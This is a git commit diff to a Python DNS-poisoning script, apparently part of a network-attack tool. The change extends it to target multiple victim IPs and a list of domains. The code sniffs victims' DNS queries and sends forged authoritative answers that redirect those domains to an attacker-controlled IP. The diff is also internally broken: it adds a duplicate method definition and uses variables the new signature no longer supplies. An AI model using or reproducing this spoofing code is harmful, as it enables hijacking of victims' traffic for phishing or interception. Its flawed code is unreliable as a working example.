9973cc57b0fc9715621bf83e763d995e6b4368ba
Thorn <thorn.prive@gmail.com>
2019-03-27 11:35:20 +0100

    Added dns to work with mulitple ips to attack

--- DnsPoisoning.py
+++ DnsPoisoning.py
@@ -9,6 +9,7 @@ class DnsPoisoning:
         self.interface = intFace
 
     def doPoison(self, ipVictim, url, ipPoison, timeSleep):
+    def doPoison(self, target1, target2, target1MAC, target2MAC, urlList, silent):
 
         def makeFakeResponse(pkt, ipVictim, url, ipPoison, interface):
             # check if the packet (is a DNS packet) AND (comes from the target)
@@ -16,22 +17,24 @@ class DnsPoisoning:
                 # check if the dns packet (is a request)
                 if (pkt[DNS].qr == 0):
                     # check if the dns packet concerns the target URL
-                    if (url is None) or (url in pkt[DNS].qd.qname):
-                        # for a response revert destination and source
-                        fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-                        fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
-                        # fake query pointing the requested URL to the poison IP
-                        fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
-                        # fake DNS response
-                        fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
-                        # combine into complete packet
-                        poisonPacket = fakeIP / fakeUDP / fakeDNS
-                        # send the poison packet to the victim
-                        send(poisonPacket, verbose=0, iface=interface)
-                        print("Fake packet sent")
+
+                    for link in url:
+                        if link in pkt[DNS].qd.qname:
+                            # for a response revert destination and source
+                            fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+                            fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+                            # fake query pointing the requested URL to the poison IP
+                            fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
+                            # fake DNS response
+                            fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
+                            # combine into complete packet
+                            poisonPacket = fakeIP / fakeUDP / fakeDNS
+                            # send the poison packet to the victim
+                            send(poisonPacket, verbose=0, iface=interface)
+                            print("Fake packet sent")
 
         while True:
-            sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
-                  iface=self.interface)
+            for ip in target1:
+                sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ip, url, ipPoison, self.interface),iface=self.interface)
 
         # print("You are poisoned")
